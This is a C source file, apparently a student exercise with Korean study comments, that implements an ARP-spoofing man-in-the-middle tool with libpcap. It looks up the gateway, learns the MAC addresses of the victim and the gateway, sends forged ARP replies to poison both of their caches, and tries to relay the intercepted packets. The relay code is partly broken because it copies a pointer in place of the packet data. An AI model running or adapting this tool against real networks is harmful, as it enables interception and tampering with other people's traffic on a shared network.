#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>

#include <pcap.h>

#define  BUFF_SIZE   1024

#define ARP_REQUEST 1  // ARP Request
#define ARP_REPLY 2     // ARP Reply

#define SIZE_ETHERNET 14
// Ethernet 헤더의 크기는 14바이트이다.

// TODO : 왜 여기서 구조체 쓰는지 알아보기

typedef struct sniff_ethernet 
{
    u_char ether_dhost[ETHER_ADDR_LEN]; // Destination Host의 Mac Address
    u_char ether_shost[ETHER_ADDR_LEN]; // Source Host의 Mac Address
    u_short ether_type;                 // Ethernet Type
}SF_ETHERNET;

// 처음에는 이러한 구조체도 사용을 안하고 가능하면 모조리 HEX를 프로세싱해서 처리하고 싶었으나
// Ethernet 프레임 형태에 따라서 TYPE의 위치값이 달라져서 그걸 하드코딩 할 생각은 하지 않음.
// 이거 내고 한번 해보죠 뭐.

#define IP_RF 0x8000  
#define IP_DF 0x4000
#define IP_MF 0x2000
#define IP_OFFMASK 0x1fff

// 순서대로  Reserved Fragment Flag, Dont Fragment Flag, More Fragment Flag
// Mask For Fragment offset이다. 여기서 DF Flag가 1이면 단편화 불가라는 의미이며,
// MF Flag가 1이면 단편화 되어 있음을 의미합니다. RF는 항상 0이죠.

typedef struct sniff_ip 
{
        u_char ip_vhl;
        u_char ip_tos;      // 서비스 타입. 서비스의 우선 순위를 제공한다고 한다.
        u_short ip_len;     // IP 패킷의 길이를 바이트 단위로 보여준다.
        u_short ip_id;      // Fragment Identifier로 단편화된 패킷을 결합하기 위한 식별정보를 저장하고 있다.
        u_short ip_off;     // Fragment offset으로 조각에 저장된 원래 데이터들을의 범위를 보여준다고 한다.
        u_char ip_ttl;      // Time-to-Live 데이터가 소멸하기 이전에 데이터가 이동 할 수 있는 단계의 수를 나타낸다.
        u_char ip_p;        // 상위 계층의 프로토콜을 검사한다. 우리는 TCP를 거를 것이므로 6이 아니면 다 거르면 될 것 같다.
        u_short ip_sum;     // 변조방지를 위해 IP 패킷의 체크섬을 저장한다.
        struct in_addr ip_src,ip_dst;   // 각각 출발지 IP 주소, 목적지 IP 주소

        #define IP_HL(ip)       (((ip)->ip_vhl) & 0x0f)     // 헤더 길이를 구하는 매크로.
        #define IP_V(ip)        (((ip)->ip_vhl) >> 4)       // IP 버전을 구하는 매크로.
}SF_IP;



typedef u_int tcp_seq;

#define TH_FIN 0x01     // 데이터 전송 종료
#define TH_SYN 0x02     // 통신 시작 시 연결을 요청하고 ISN을 교환한다.
#define TH_RST 0x04     // 송신자가 유효하지 않은 연결을 시도할 때 거부하는 데에 사용하고,
                        // 통신의 연결 및 종료를 정상적으로 할 수 없을 때 사용한다.
#define TH_PUSH 0x08    // 모든 데이터를 전송하고 마지막에 보내는 신호이다.
#define TH_ACK 0x10     // SYN에 대한 확인의 의미이다.
                        // TODO : 3Way-Handshaking에 관해 연구
#define TH_URG 0x20     // Urgent Point 필드와 함께 사용되며 플래그 설정 시 TCP는 해당 세그먼트를
                        // 전송 큐의 제일 앞으로 보낸다. 
#define TH_ECE 0x40     // 통신 혼잡 감지 시, 수신자가 ECE를 설정하여 송신자에게 알린다.
#define TH_CWR 0x80     // 송신자가 자신의 윈도우 사이즈를 줄임을 알린다.
#define TH_FLAGS (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR) // 플래그 정의

typedef struct sniff_tcp 
{
    u_short th_sport;       // 소스 포트
    u_short th_dport;       // Destination 포트
    tcp_seq th_seq;         // Sequence Number. 세그먼트 데이터의 순서를 표기한다.
    tcp_seq th_ack;         // Acknowledge Number. Sequence Number의 확인 응답.
    u_char th_offx2;        // 예약된 데이터. 항상 0.

#define TH_OFF(th)  (((th)->th_offx2 & 0xf0) >> 4)      // 헤더 길이를 구해줌.
    
    u_char th_flags;        // Flag 데이터
    u_short th_win;         // 송신 시스템에서 자신이 수용하는 한 버퍼의 크기를 byte단위로 나타낸다.
    u_short th_sum;         // TCP 패킷 체크섬
    u_short th_urp;         // 긴급한 처리를 요구하는 Urgent 데이터의 마지막 byte의 일련번호
}SF_TCP;

typedef struct arphadr { 
    u_int16_t htype;    /* Hardware Type           */ 
    u_int16_t ptype;    /* Protocol Type           */ 
    u_char hlen;        /* Hardware Address Length */ 
    u_char plen;        /* Protocol Address Length */ 
    u_int16_t oper;     /* Operation Code          */ 
    u_char sha[6];      /* Sender hardware address */ 
    u_char spa[4];      /* Sender IP address       */ 
    u_char tha[6];      /* Target hardware address */ 
    u_char tpa[4];      /* Target IP address       */ 
}arphdr_t; 

#define MAXBYTES_CAPTURE 2048 

int sendarp_req(pcap_t *descr, unsigned char* req_target_ip, unsigned char* req_source_ip,  unsigned char* req_target_mac,  unsigned char* req_source_mac)
{
    // Construct Ethernet header (except for source MAC address).
    // (Destination set to broadcast address, FF:FF:FF:FF:FF:FF.)
    struct ether_header header;
    header.ether_type=htons(ETH_P_ARP);
    
    // Construct ARP request (except for MAC and IP addresses).
    struct ether_arp req;
    req.arp_hrd=htons(ARPHRD_ETHER);
    req.arp_pro=htons(ETH_P_IP);
    req.arp_hln=ETHER_ADDR_LEN;
    req.arp_pln=sizeof(in_addr_t);
    req.arp_op=htons(ARPOP_REQUEST);

    // Convert target IP address from string, copy into ARP request.
    struct in_addr target_ip_addr={0};
    if (!inet_aton(req_target_ip,&target_ip_addr)) {
       fprintf(stderr,"%s is not a valid IP address",req_target_ip);
       exit(1);
    }
    memcpy(&req.arp_tpa,&target_ip_addr.s_addr,sizeof(req.arp_tpa));
    struct in_addr source_ip_addr={0};
    if (!inet_aton(req_source_ip,&source_ip_addr)) {
       fprintf(stderr,"%s is not a valid IP address",req_source_ip);
       exit(1);
    }

    memcpy(&req.arp_spa,&source_ip_addr.s_addr,sizeof(req.arp_spa));
    memcpy(header.ether_dhost,req_target_mac,sizeof(header.ether_dhost));
    memcpy(header.ether_shost,req_source_mac,sizeof(header.ether_shost));
    memcpy(&req.arp_sha,req_source_mac,sizeof(req.arp_sha));
    memcpy(&req.arp_tha,req_target_mac,sizeof(req.arp_tha));

    unsigned char frame[sizeof(struct ether_header)+sizeof(struct ether_arp)];
    memcpy(frame,&header,sizeof(struct ether_header));
    memcpy(frame+sizeof(struct ether_header),&req,sizeof(struct ether_arp));

    if (pcap_inject(descr,frame,sizeof(frame))==-1) {
        pcap_perror(descr,0);
        pcap_close(descr);
        exit(1);
    }
}

int sendarp_rep(pcap_t *descr, unsigned char* rep_target_ip, unsigned char* rep_source_ip,  unsigned char* rep_target_mac,  unsigned char* rep_source_mac)
{
    // Construct Ethernet header (except for source MAC address).
    // (Destination set to broadcast address, FF:FF:FF:FF:FF:FF.)
    struct ether_header header;
    header.ether_type=htons(ETH_P_ARP);
    
    // Construct ARP request (except for MAC and IP addresses).
    struct ether_arp rep;
    rep.arp_hrd=htons(ARPHRD_ETHER);
    rep.arp_pro=htons(ETH_P_IP);
    rep.arp_hln=ETHER_ADDR_LEN;
    rep.arp_pln=sizeof(in_addr_t);
    rep.arp_op=htons(ARPOP_REPLY);

    // Convert target IP address from string, copy into ARP request.
    struct in_addr target_ip_addr={0};
    if (!inet_aton(rep_target_ip,&target_ip_addr)) {
       fprintf(stderr,"%s is not a valid IP address",rep_target_ip);
       exit(1);
    }
    memcpy(&rep.arp_tpa,&target_ip_addr.s_addr,sizeof(rep.arp_tpa));
    struct in_addr source_ip_addr={0};
    if (!inet_aton(rep_source_ip,&source_ip_addr)) {
       fprintf(stderr,"%s is not a valid IP address",rep_source_ip);
       exit(1);
    }

    memcpy(&rep.arp_spa,&source_ip_addr.s_addr,sizeof(rep.arp_spa));
    memcpy(header.ether_dhost,rep_target_mac,sizeof(header.ether_dhost));
    memcpy(header.ether_shost,rep_source_mac,sizeof(header.ether_shost));
    memcpy(&rep.arp_sha,rep_source_mac,sizeof(rep.arp_sha));
    memcpy(&rep.arp_tha,rep_target_mac,sizeof(rep.arp_tha));

    unsigned char frame[sizeof(struct ether_header)+sizeof(struct ether_arp)];
    memcpy(frame,&header,sizeof(struct ether_header));
    memcpy(frame+sizeof(struct ether_header),&rep,sizeof(struct ether_arp));

    if (pcap_inject(descr,frame,sizeof(frame))==-1) {
        pcap_perror(descr,0);
        pcap_close(descr);
        exit(1);
    }
}

int maccmp(unsigned char* a, unsigned char* b)
{
    for(int i=0; i<6; i++)
    {
        if(a[i] != b[i])
            return 1;
    }

    return 0;
}

void ip_in(char* org_string, unsigned char* inip)
{
    int len;
    len = sprintf(org_string, "%d", inip[0]);
    len += sprintf(len + org_string, ".%d", inip[1]);
    len += sprintf(len + org_string, ".%d", inip[2]);
    len += sprintf(len + org_string, ".%d", inip[3]);
}

int main(int argc, char *argv[])
{
    if (argc != 2)
    { 
        printf("USAGE: send_arp <victim_ip>\n"); 
        exit(1); 
    }

    char* victim_ip = argv[1];
    int fd;
    struct ifreq ifr;
    
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, "wlp1s0", IFNAMSIZ-1);

    ioctl(fd, SIOCGIFHWADDR, &ifr);

    unsigned char* mac = (unsigned char*)ifr.ifr_hwaddr.sa_data;
    printf("MAC ADDRESS : %02x:%02x:%02x:%02x:%02x:%02x\n",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);

    close(fd);

    char  buff[BUFF_SIZE];
    char buff2[BUFF_SIZE];
    char ips[BUFF_SIZE] = {0};
    char gateway[BUFF_SIZE] = {0};

    FILE *fp = popen("nmcli dev show wlp1s0 | awk \'{ print $2}\'","r");

    for(int i=0; i<8; i++)
    {
        if(i==7)
            fgets(buff2,BUFF_SIZE,fp);
        fgets(buff,BUFF_SIZE,fp);
    }

    for(int s=0; s<sizeof(buff2); s++)
    {
        if(buff2[s] == 47)
            break;
        ips[s] = buff2[s];
    }

    printf("IP ADDRESS : %s\n", ips);

    for(int s=0; s<sizeof(buff); s++)
    {
        if(buff[s] == 10)
            break;
        gateway[s] = buff[s];
    }

    printf("GATEWAY IP : %s\n", gateway);

    pclose(fp);

    char *dev, errbuf[PCAP_ERRBUF_SIZE];


    dev = pcap_lookupdev(errbuf);
    int i=0; 
    bpf_u_int32 netaddr=0, mask=0;    /* To Store network address and netmask   */ 
    pcap_t *descr = NULL;             /* Network interface handler              */ 
    struct pcap_pkthdr pkthdr;        /* Packet information (timestamp,size...) */ 
    const unsigned char *packet=NULL; /* Received raw data                      */ 
    arphdr_t *arpheader = NULL;       /* Pointer to the ARP header              */ 

    /* Open network device for packet capture */ 
    if ((descr = pcap_open_live(dev, MAXBYTES_CAPTURE, 0,  256, errbuf))==NULL)
    {
            fprintf(stderr, "ERROR: %s\n", errbuf);
            exit(1);
    }
    
    /* Look up info from the capture device. */ 
    if( pcap_lookupnet( dev , &netaddr, &mask, errbuf) == -1)
    {
            fprintf(stderr, "ERROR: %s\n", errbuf);
            exit(1);
    }

    unsigned char zero_mac[6];
    zero_mac[0] = 0xff;
    zero_mac[1] = 0xff;
    zero_mac[2] = 0xff;
    zero_mac[3] = 0xff;
    zero_mac[4] = 0xff;
    zero_mac[5] = 0xff;
    unsigned char* test = (unsigned char*) zero_mac;

    sendarp_req(descr, gateway,ips, test,mac);
    sendarp_req(descr, victim_ip,ips, test,mac);

    char gateway_get[BUFF_SIZE];
    char victim_get[BUFF_SIZE];
    unsigned char gateway_mac[6];
    unsigned char victim_mac[6];

    int isGetGateway = 0;
    int isGetVictim = 0;

    int turn = 0;


    while(1)
    { 
        if(!isGetVictim)
            sendarp_req(descr, victim_ip,ips, test,mac);
        if(!isGetGateway)
            sendarp_req(descr, gateway,ips, test,mac);

        if(isGetVictim && isGetGateway && (turn%20 == 1))
        {
            sendarp_rep(descr, gateway, victim_ip, gateway_mac, mac);
            printf("Sending ARP Packet to GW.....\n");
        }

        if(isGetVictim && isGetGateway && (turn%20 == 0))
        {
            sendarp_rep(descr, victim_ip, gateway, victim_mac, mac);
            printf("Sending ARP Packet to Victim.....\n");
        }

        if(turn==30)
            turn = 0;
        else
            turn = turn+1;;

        if ( (packet = pcap_next(descr,&pkthdr)) == NULL)
        {  /* Get one packet */ 
                 fprintf(stderr, "Packet Capture Failure : %s\n", errbuf);
                  continue;
        }

        const SF_ETHERNET *ethernet;
        ethernet = (SF_ETHERNET*)(packet);

        if((!isGetGateway || !isGetVictim) && ethernet->ether_type == 1544)
        {

             arpheader = (struct arphadr *)(packet+14); /* Point to the ARP header */ 
              if(isGetGateway)
             ip_in(victim_get, arpheader->spa);
                ip_in(gateway_get, arpheader->spa);

        if(!isGetGateway)
            printf("GATEWAYIP : %s\n",gateway_get);
        
        if(!strcmp(gateway_get,gateway) && !isGetGateway)
        {
            printf("Get GW MAC Data.....\n");
            gateway_mac[0] = arpheader->sha[0];
            gateway_mac[1] = arpheader->sha[1];
            gateway_mac[2] = arpheader->sha[2];
            gateway_mac[3] = arpheader->sha[3];
            gateway_mac[4] = arpheader->sha[4];
            gateway_mac[5] = arpheader->sha[5];
            isGetGateway = 1;
        }

        if(!strcmp(victim_ip,victim_get) && !isGetVictim)
        {
            printf("Get Victim MAC Data.....\n");
            victim_mac[0] = arpheader->sha[0];
            victim_mac[1] = arpheader->sha[1];
            victim_mac[2] = arpheader->sha[2];
            victim_mac[3] = arpheader->sha[3];
            victim_mac[4] = arpheader->sha[4];
            victim_mac[5] = arpheader->sha[5];
            isGetVictim = 1;
        }

        }

        if(isGetVictim && isGetGateway &&  (ethernet->ether_type == 8))
        {
            printf("Checker!\n");
            SF_ETHERNET ether_inject;
            char *payload;
            payload = (u_char *)(packet + SIZE_ETHERNET);

            unsigned char se_packet[sizeof(SF_ETHERNET)+sizeof(payload)];

            if(!maccmp(ethernet->ether_shost,mac))
            {
                memcpy(&ether_inject.ether_dhost,&gateway_mac,sizeof(ether_inject.ether_dhost));
                memcpy(&ether_inject.ether_type,&ethernet->ether_type,sizeof(ether_inject.ether_type));
                memcpy(se_packet,&ether_inject,sizeof(SF_ETHERNET));
                memcpy(se_packet+sizeof(ether_inject),&payload,sizeof(payload));

            if(pcap_sendpacket(descr, se_packet ,sizeof(se_packet)) == -1)
                printf("Failed to send packet\n");
            else
                printf("My Packets....\n");
            continue;
            }

            if(!maccmp(ethernet->ether_shost, victim_mac))
            {
                memcpy(&ether_inject.ether_shost,&mac,sizeof(ether_inject.ether_shost));
                memcpy(&ether_inject.ether_dhost,&gateway_mac,sizeof(ether_inject.ether_dhost));
                memcpy(&ether_inject.ether_type,&ethernet->ether_type,sizeof(ether_inject.ether_type));
                memcpy(se_packet,&ether_inject,sizeof(SF_ETHERNET));
            memcpy(se_packet+sizeof(ether_inject),&payload,sizeof(payload));

            if(pcap_sendpacket(descr, se_packet ,sizeof(se_packet)) == -1)
                printf("Failed to send packet\n");
            else
                printf("Victim Packets....\n");
            continue;
            }

            if(!maccmp(ethernet->ether_shost, gateway_mac))
            {
                memcpy(&ether_inject.ether_shost,&mac,sizeof(ether_inject.ether_shost));
                memcpy(&ether_inject.ether_dhost,&victim_mac,sizeof(ether_inject.ether_dhost));
                memcpy(&ether_inject.ether_type,&ethernet->ether_type,sizeof(ether_inject.ether_type));
                memcpy(se_packet,&ether_inject,sizeof(SF_ETHERNET));
            memcpy(se_packet+sizeof(ether_inject),&payload,sizeof(payload));

            if(pcap_sendpacket(descr, se_packet ,sizeof(se_packet)) == -1)
                printf("Failed to send packet\n");
            else
                printf("Gateway Packets....\n");
            continue;

            }

            else
                continue;

        }

    } 

    return 0;
}